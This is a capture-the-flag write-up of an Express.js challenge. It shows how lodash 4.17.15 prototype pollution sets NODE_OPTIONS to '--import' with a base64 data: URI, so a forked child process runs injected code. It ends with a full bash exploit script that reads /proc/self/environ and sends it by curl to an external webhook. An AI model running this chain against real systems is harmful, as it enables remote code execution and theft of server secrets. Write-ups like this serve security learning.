    

# Hey there!


### Challenge Overview

*   **Name:** Utopia City Government Portal
*   **Difficulty:** Easy
*   **Description:** Utopia City has deployed a government portal for citizens to contact city officials and access services.

### Part 1: Analyzing the Backend Logic

The first step was to examine the code. The code revealed a  Express.js application with a few critical components.

**Key Code Snippets:**

*   **The Vulnerable Function (`/api/contact`):**
    ```javascript
    const _ = require('lodash');
    // ...
    app.post('/api/contact', (req, res) => {
        try {
            const config = { /* defaults */ };
            Object.keys(req.body.config).forEach(key => {
                _.set(config, key, req.body.config[key]);
            });
            // ...
    ```

*   **The Trigger (`/api/contact`):**
    ```javascript
    // ... (immediately after the pollution)
    const { fork } = require('child_process');
    // ...
    const child = fork(scriptPath);
    // ...
    ```

*   **The Dependencies (`package.json`):**
    *   `"lodash": "4.17.15"`
    *   `"express-handlebars": "^7.1.2"`

This initial analysis revealed three critical facts:
1.  The application uses a known vulnerable version of `lodash` (`4.17.15`), making the app vulnerable to Prototype Pollution,
2.  Immediately after the pollution occurs, the code calls `child_process.fork()`. This can be use RCE (remote code execution) if we can control its options or environment.
3.  The application runs on a modern node.js version

It was obvious what we had to do: Use Prototype Pollution to control the environment of the forked child process to get RCE.

### Part 2: The Journey of Trial and Error


I first tried to avoid RCE and try an Arbitrary File Read. The goal was to pollute the `layout` property used by the `express-handlebars` engine when rendering the 404 error page.

The engine always appended a `.handlebars` extension to any filename without one. Attempts to bypass this using classic tricks were all defeated:
*   Trailing Dot (`/etc/environment.`):*The filesystem tried to open a file with a dot at the end.
*    Null Byte (`/etc/environment\u0000`): The modern Node.js `fs` module threw an error, explicitly rejecting paths with null bytes.
*   Polluting `extname`: This property was configured at startup and could not be changed by runtime pollution.

### Part 3: Finding the Golden Gadget

Frustrated, I consulted the excellent research on **Payloads All The Things** and **HackTricks**. 
From there, i found a gadget that would be basically what solved the problem:

 [`Filesystem-less PP2RCE via --import (Node ≥ 19)`](https://book.hacktricks.wiki/en/pentesting-web/deserialization/nodejs-proto-prototype-pollution/prototype-pollution-to-rce.html#filesystem-less-pp2rce-via---import-node--19)


It supports `data:` URIs, meaning the entire payload can be Base64-encoded and passed in the environment variable,


The final attack vector was:
1.  Craft a Node.js payload using ESM `import` syntax to read `/proc/self/environ`, Base64-encode it, and `curl` it to an external webhook.
2.  Base64-encode this entire script.
3.  Create a `data:` URI with the encoded script.
4.  Use prototype pollution to inject `NODE_OPTIONS` with the value `--import <your_data_uri>`.
5.  Let the `fork()` command trigger the exploit.

### Part 4: The Final Script

This script automates the entire process, from crafting the payload to sending the final exploit. It's designed to exfiltrate the flag from the remote server to a webhook.

```bash
#!/bin/bash

# --- Configuration ---
TARGET_URL="https://aa6b8031aacb1355.chal.ctf.ae/api/contact"
WEBHOOK_URL="https://webhook.site/0289a7e0-7060-4497-9d3e-62bf1c2c0d3f" # Replace with your webhook
TARGET_FILE="/proc/self/environ"

echo "[+] Preparing exploit for target: $TARGET_URL"

# --- Payload Crafting ---
# 1. The Node.js code in modern ESM syntax.
NODE_CODE="import fs from 'fs'; import { execSync } from 'child_process'; const flag = fs.readFileSync('${TARGET_FILE}'); execSync('curl ${WEBHOOK_URL}/?flag=' + Buffer.from(flag).toString('base64')); process.exit();"

# 2. Base64-encode the Node.js code.
ENCODED_CODE=$(echo -n "$NODE_CODE" | base64 -w0)

# 3. The final data URI for the --import gadget.
DATA_URI="data:text/javascript;base64,${ENCODED_CODE}"

echo "[+] Generated Data URI payload."

# --- Sending the Exploit ---
echo "[+] Sending the final payload..."
curl -X POST "$TARGET_URL" \
-H 'Content-Type: application/json' \
-d @- <<EOF
{
  "config": {
    "constructor.prototype.NODE_OPTIONS": "--import ${DATA_URI}"
  }
}
EOF

echo
echo "[+] Exploit sent. Check your webhook for the flag."
```

Running this script successfully exfiltrated the environment variables from the server, which contained the flag: **`FLAG=flag{66b266e98c785551}`**


